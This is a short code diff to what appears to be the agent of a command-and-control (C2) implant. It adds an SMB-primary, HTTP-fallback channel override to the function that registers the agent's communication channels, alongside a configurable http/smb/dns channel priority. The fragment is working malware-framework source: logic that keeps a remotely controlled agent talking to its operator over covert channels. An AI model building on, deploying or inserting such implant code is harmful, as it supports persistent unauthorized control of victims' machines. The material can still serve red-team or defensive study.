@@ -33,6 +33,34 @@ void channels_register(void) {
     }
 
     /*
+     * C2 SMB override: agent was spawned via --server-connection with SMB listener.
+     * SMB is the primary channel, with HTTP as fallback.
+     */
+    if (g_c2smb_override) {
+        g_channels[0].type = CHANNEL_SMB;
+        g_channels[0].name = "SMB";
+        g_channels[0].init = smb_init;
+        g_channels[0].cleanup = smb_cleanup;
+        g_channels[0].send_recv = smb_send_recv;
+        g_channels[0].initialized = FALSE;
+        g_channels[0].consecutive_failures = 0;
+        g_channel_count = 1;
+
+        /* Also register HTTP as fallback */
+        g_channels[1].type = CHANNEL_HTTP;
+        g_channels[1].name = "HTTP";
+        g_channels[1].init = http_init;
+        g_channels[1].cleanup = http_cleanup;
+        g_channels[1].send_recv = http_send_recv;
+        g_channels[1].initialized = FALSE;
+        g_channels[1].consecutive_failures = 0;
+        g_channel_count = 2;
+
+        g_active_channel = 0;
+        return;
+    }
+
+    /*
      * Parse CHANNEL_PRIORITY ("http,smb,dns") and register
      * channels in the specified order.
      */
